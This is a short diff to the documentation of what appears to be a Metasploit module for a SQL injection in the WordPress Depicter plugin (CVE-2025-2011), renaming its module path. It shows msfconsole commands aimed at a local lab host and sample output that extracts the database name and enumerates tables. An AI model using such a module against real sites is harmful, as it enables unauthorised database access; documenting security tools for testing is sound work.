@@ -78,7 +78,7 @@ msfconsole
 2. **Load the Depicter SQLi scanner**
 
 ```bash
-use auxiliary/scanner/http/wp_depicter_sqli_cve_2025_2011
+use auxiliary/gather/wp_depicter_sqli_cve_2025_2011
 set RHOSTS 127.0.0.1
 set RPORT 5555
 set TARGETURI /
@@ -106,7 +106,7 @@ The module should:
 ## Scenarios
 
 ```bash
-msf6 auxiliary(scanner/http/wp_depicter_sqli_cve_2025_2011) > run http://lab:5555
+msf6 auxiliary(gather/wp_depicter_sqli_cve_2025_2011) > run http://lab:5555
 [*] Retrieving database name via SQLi...
 [+] Database name: exploit_market
 [*] Enumerating tables for prefix inference...
